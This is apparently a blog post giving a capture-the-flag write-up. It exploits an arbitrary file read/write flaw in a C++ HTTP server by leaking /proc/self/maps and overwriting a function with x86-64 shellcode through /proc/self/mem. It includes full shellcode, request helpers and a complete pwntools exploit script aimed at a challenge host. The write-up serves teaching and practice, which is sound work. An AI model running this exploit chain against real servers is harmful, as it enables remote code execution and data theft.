<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PROC-SELF-MEM-EXPLOIT(1)</title>
    <link rel="stylesheet" href="../styles.css">
    <!-- Highlight.js CSS -->
    <link rel="stylesheet" href="https://unpkg.com/@highlightjs/cdn-assets@11.7.0/styles/default.min.css" />
</head>
<body>
<div class="header">
    <h1>PROC-SELF-MEM-EXPLOIT(1)</h1>
    <nav><a href="../index.html">home</a> <a href="../blog.html">posts</a></nav>
</div>
<div class="article-header">
    <div class="article-meta">2026-02-16 | CTF Writeups | 18 min read</div>
    <h1 class="article-title">Exploiting /proc/self/mem for Code Injection in a C++ HTTP Server</h1>
</div>
<h2>SYNOPSIS</h2>
<p>
A detailed walkthrough of exploiting an arbitrary file read/write vulnerability in a custom HTTP server to achieve remote code execution through /proc/self/mem manipulation. We'll cover memory layout analysis, shellcode construction, and practical exploitation techniques that bypass modern security features.
</p>
<h2>DESCRIPTION</h2>
<p>
The challenge presents a minimal HTTP server written in C++ that implements GET and PUT methods for file operations. The vulnerability is straightforward: the server allows reading and writing to ANY file path provided by the user, including special files in /proc. This gives us arbitrary read/write primitives within the process's memory space.
</p>
<p>
The flag is stored in a file named /flag-&lt;64 random hex chars&gt; in the root directory. Our goal is to execute code that lists the root directory, finds the flag filename, and reads its contents. Since we can't directly list directories through the HTTP interface, we need to inject shellcode into the running process.
</p>

<h3>Initial Reconnaissance</h3>
<p>
The server handles requests in forked child processes. Each connection gets its own isolated process memory space. This is important because any modifications we make only affect that specific child process. The relevant code structure:
</p>
<pre><code class="language-cpp">void Server::handle_client(int client_fd, struct sockaddr_in client_addr) {
    // Each connection runs in its own forked process
    while (true) {
        // Parse HTTP request
        if (req.method == "GET") {
            process_get(client_fd, req.path, ...);
        } else if (req.method == "PUT") {
            process_put(client_fd, req.path, req.offset, req.body);
        }
    }
}</code></pre>
<p>
The process_get function opens the requested file and sends its contents back to the client. The process_put function writes data to a file at a specified offset. Neither function validates the file path, which means we can read from and write to /proc/self/mem.
</p>

<h3>Understanding /proc/self/mem</h3>
<p>
The /proc/self/mem file is a special interface that provides direct access to a process's entire memory space. Reading from it at a specific offset reads from that virtual address. Writing to it modifies memory at that address. Critically, the kernel allows writes to executable memory regions through this interface using the FOLL_FORCE flag, bypassing normal page permissions.
</p>
<p>
This gives us the ability to:
</p>
<ul>
<li>Read the process memory layout via /proc/self/maps</li>
<li>Identify where executable code resides</li>
<li>Overwrite function code with our own shellcode</li>
<li>Trigger execution by calling that function</li>
</ul>

<h2>EXPLOITATION STRATEGY</h2>

<h3>Step 1: Leak Memory Layout</h3>
<p>
First, we need to determine where the binary is loaded in memory. ASLR randomizes the base address on each execution, so we read /proc/self/maps to get the current layout:
</p>
<pre><code class="language-python">def http_get(sock, path):
    query = f"path={path}"
    req = f"GET /?{query} HTTP/1.1\r\n"
    req += f"Connection: keep-alive\r\n\r\n"
    sock.send(req.encode())
    # ... receive and parse response
    return status_code, body

sock = remote(HOST, PORT)
status, maps_data = http_get(sock, "/proc/self/maps")
maps_str = maps_data.decode()</code></pre>
<p>
The maps output shows memory regions with their permissions and file mappings:
</p>
<pre><code class="language-python">716d7cdae000-716d7cf40000 r-xp 0001a000 00:3c 3182529  /app/server
716d7cfbf000-716d7cfc1000 rw-p 0022a000 00:3c 3182529  /app/server</code></pre>
<p>
We need the base address of the first mapping with file offset 00000000. This tells us where the binary's text section starts. The process_get function is at a fixed offset from this base address.
</p>

<h3>Step 2: Calculate Target Address</h3>
<p>
To find the offset of process_get, we compile the server binary locally and use nm or objdump:
</p>
<pre><code class="language-python">$ g++ -std=c++17 -O2 -static-pie src/main.cpp src/server.cpp -o server
$ nm server | grep process_get
000000000001f786 T _ZN6Server11process_getE...</code></pre>
<p>
The offset is 0x1f786 from the binary base. Combined with the runtime base address from /proc/self/maps, we can calculate the exact address where process_get exists in memory:
</p>
<pre><code class="language-python">base_addr = 0x716d7cdae000  # From maps (r--p with offset 0)
PROCESS_GET_OFFSET = 0x1f786
process_get_addr = base_addr + PROCESS_GET_OFFSET
# Result: 0x716d7cdcd786</code></pre>

<h3>Step 3: Craft the Shellcode</h3>
<p>
The shellcode needs to accomplish several tasks:
</p>
<ol>
<li>Save the client socket file descriptor (passed in esi register)</li>
<li>Open the root directory with openat()</li>
<li>List directory entries using getdents64()</li>
<li>Send the raw directory data back to the client socket</li>
<li>Exit cleanly</li>
</ol>
<p>
Here's the critical part: we extract the client FD from the esi register because it's passed as a parameter to process_get. This allows us to write output directly back to the connected client:
</p>
<pre><code class="language-python">sc = asm("""
    /* Save client_fd from esi to r15d */
    mov r15d, esi
    
    /* openat(AT_FDCWD, "/", O_RDONLY | O_DIRECTORY) */
    xor eax, eax
    push rax
    mov byte ptr [rsp], 0x2f    /* "/" on stack */
    mov eax, 257                 /* sys_openat */
    mov edi, -100                /* AT_FDCWD */
    mov rsi, rsp
    mov edx, 0x10000             /* O_RDONLY | O_DIRECTORY */
    syscall
    mov r14d, eax                /* Save dir fd */
    
    /* Clean up stack */
    pop rax
    
    /* getdents64(dir_fd, buf, 0x1000) */
    sub rsp, 0x1000              /* Allocate buffer on stack */
    mov eax, 217                 /* sys_getdents64 */
    mov edi, r14d
    mov rsi, rsp
    mov edx, 0x1000
    syscall
    
    /* write(client_fd, buf, count) */
    mov edx, eax                 /* bytes read from getdents64 */
    mov eax, 1                   /* sys_write */
    mov edi, r15d                /* client socket fd */
    mov rsi, rsp                 /* buffer */
    syscall
    
    /* exit(0) */
    mov eax, 60
    xor edi, edi
    syscall
""")</code></pre>

<h3>Step 4: Inject the Shellcode</h3>
<p>
With the shellcode compiled and the target address calculated, we write it to /proc/self/mem at the process_get function's location:
</p>
<pre><code class="language-python">def http_put(sock, path, data, offset=0):
    query = f"path={path}&offset={offset}"
    req = f"PUT /?{query} HTTP/1.1\r\n"
    req += f"Content-Length: {len(data)}\r\n"
    req += f"Connection: keep-alive\r\n\r\n"
    sock.send(req.encode() + data)
    # ... receive response
    return status_code, body

shellcode = build_shellcode()
status, body = http_put(sock, "/proc/self/mem", shellcode,
                        offset=process_get_addr, keep_alive=True)</code></pre>
<p>
The PUT request writes our shellcode directly over the process_get function code. The kernel allows this write even though the memory region has r-xp (read-execute, not writable) permissions because /proc/self/mem uses special flags.
</p>

<h3>Step 5: Trigger Execution</h3>
<p>
Now we trigger the modified process_get function by sending another GET request. Since we're using keep-alive connections, this happens in the same process where we injected the shellcode:
</p>
<pre><code class="language-python">req = f"GET /?path=/tmp/trigger HTTP/1.1\r\n"
req += f"Connection: close\r\n\r\n"
sock.send(req.encode())

# Receive raw getdents64 data (no HTTP headers)
raw_data = b""
while True:
    chunk = sock.recv(4096, timeout=2)
    if not chunk:
        break
    raw_data += chunk</code></pre>
<p>
Our shellcode executes instead of the original process_get code. It lists the root directory and writes the raw getdents64 output directly to the client socket, then exits. The connection closes, but we've captured the directory listing.
</p>

<h3>Step 6: Parse Directory Entries</h3>
<p>
The getdents64 syscall returns data in linux_dirent64 structures. Each entry contains:
</p>
<pre><code class="language-python">struct linux_dirent64 {
    ino64_t        d_ino;      /* 8 bytes: inode number */
    off64_t        d_off;      /* 8 bytes: offset to next */
    unsigned short d_reclen;   /* 2 bytes: length of this entry */
    unsigned char  d_type;     /* 1 byte: file type */
    char           d_name[];   /* variable: null-terminated filename */
};</code></pre>
<p>
We parse this structure to extract filenames:
</p>
<pre><code class="language-python">def parse_getdents(data):
    entries = []
    offset = 0
    while offset < len(data):
        if offset + 19 > len(data):
            break
        d_ino = struct.unpack_from('<Q', data, offset)[0]
        d_reclen = struct.unpack_from('<H', data, offset + 16)[0]
        if d_reclen == 0:
            break
        
        # Extract null-terminated filename
        name_end = data.find(b'\x00', offset + 19)
        if name_end == -1:
            name_end = offset + d_reclen
        d_name = data[offset + 19:name_end].decode(errors='replace')
        
        entries.append(d_name)
        offset += d_reclen
    return entries</code></pre>

<h3>Step 7: Read the Flag</h3>
<p>
Once we find a filename starting with "flag-", we open a new connection and read it:
</p>
<pre><code class="language-python">for name in entries:
    if name.startswith("flag-"):
        flag_file = "/" + name
        sock = remote(HOST, PORT)
        status, flag_data = http_get(sock, flag_file)
        if status == 200:
            print(f"FLAG: {flag_data.decode().strip()}")
        sock.close()
        break</code></pre>

<h2>EXAMPLES</h2>

<h3>Complete Exploit</h3>
<pre><code class="language-python">#!/usr/bin/env python3
from pwn import *
import struct

context.arch = 'amd64'
HOST = 'challenges.1pc.tf'
PORT = 41932

# Step 1: Leak memory layout
sock = remote(HOST, PORT)
status, maps_data = http_get(sock, "/proc/self/maps", keep_alive=False)
sock.close()

# Step 2: Calculate addresses
base_addr = get_binary_base(maps_data.decode())
process_get_addr = base_addr + 0x1f786

# Step 3: Build shellcode
shellcode = build_shellcode()  # See above for implementation

# Step 4: Inject shellcode
sock = remote(HOST, PORT)
http_put(sock, "/proc/self/mem", shellcode,
         offset=process_get_addr, keep_alive=True)

# Step 5: Trigger and capture output
sock.send(b"GET /?path=/tmp/x HTTP/1.1\r\nConnection: close\r\n\r\n")
raw_data = sock.recvall()
sock.close()

# Step 6: Parse directory listing
entries = parse_getdents(raw_data)
flag_file = next((f"/{name}" for name in entries 
                  if name.startswith("flag-")), None)

# Step 7: Read flag
sock = remote(HOST, PORT)
status, flag = http_get(sock, flag_file)
print(f"FLAG: {flag.decode()}")
sock.close()</code></pre>

<h2>NOTES</h2>
<p>
<strong>Why This Works:</strong> The kernel's /proc/self/mem implementation uses get_user_pages() with FOLL_FORCE, which bypasses VM_WRITE permission checks. This allows writing to read-execute pages that would normally be protected.
</p>
<p>
<strong>Keep-Alive Connections:</strong> Using keep-alive is critical. Each connection creates a new forked process with fresh memory. You must inject and trigger the shellcode within the same connection to execute your code.
</p>
<p>
<strong>Register Preservation:</strong> The shellcode doesn't need to preserve registers carefully because we call exit(0) at the end. We're not returning to the original code path.
</p>
<p>
<strong>Client FD Extraction:</strong> The key insight is that process_get receives the client socket FD as a parameter. By examining the function signature and calling convention, we know it's in the esi register. Saving this lets us write output back to the client.
</p>
<p>
<strong>Static PIE Binaries:</strong> The server is compiled as static-pie, meaning all code is position-independent but statically linked. This affects how we calculate offsets but doesn't prevent the exploitation technique.
</p>

<h2>PITFALLS</h2>
<p>
During the solving process, several approaches failed:
</p>
<p>
<strong>Wrong Offset Calculation:</strong> Initially used 0x2304e based on assumptions instead of properly analyzing the binary. Always verify offsets with nm or objdump on the actual compiled binary.
</p>
<p>
<strong>File Creation Attempts:</strong> Tried creating test files with creat() syscalls to verify execution. This failed because the shellcode had bugs or insufficient permissions. Writing to the client socket is more reliable.
</p>
<p>
<strong>Verification in Different Processes:</strong> Attempted to verify shellcode execution by checking for created files in a new connection. This doesn't work because each connection is a separate process. Files created by shellcode persist, but memory modifications don't.
</p>
<p>
<strong>Assuming Kernel Blocking:</strong> Spent time investigating whether the kernel blocks /proc/self/mem writes to executable memory. Modern kernels do allow this for debugging purposes. The issue was incorrect targeting, not kernel restrictions.
</p>

<h2>SEE ALSO</h2>
<p>
<a href="https://offlinemark.com/2021/05/12/an-obscure-quirk-of-proc/">An Obscure Quirk of /proc</a> - Detailed analysis of /proc/self/mem write behavior
</p>
<p>
<a href="https://man7.org/linux/man-pages/man2/getdents.2.html">getdents64(2)</a> - Linux manual page for directory enumeration
</p>
<p>
<a href="https://elixir.bootlin.com/linux/latest/source/fs/proc/base.c">Linux kernel source: fs/proc/base.c</a> - Implementation of /proc filesystem
</p>

<div class="footer">
    <p><a href="../blog.html">back to posts</a></p>
</div>

<!-- Highlight.js JS -->
<script src="https://unpkg.com/@highlightjs/cdn-assets@11.7.0/highlight.min.js"></script>

<!-- Language Support -->
<script src="https://unpkg.com/@highlightjs/cdn-assets@11.7.0/languages/cpp.min.js"></script>
<script src="https://unpkg.com/@highlightjs/cdn-assets@11.7.0/languages/c.min.js"></script>
<script src="https://unpkg.com/@highlightjs/cdn-assets@11.7.0/languages/python.min.js"></script>
<script src="https://unpkg.com/@highlightjs/cdn-assets@11.7.0/languages/x86asm.min.js"></script>
<script src="https://unpkg.com/@highlightjs/cdn-assets@11.7.0/languages/bash.min.js"></script>

<script>
document.addEventListener('DOMContentLoaded', () => {
    document.querySelectorAll('pre code').forEach((block) => {
        hljs.highlightElement(block);
    });
});
</script>

</body>
</html>
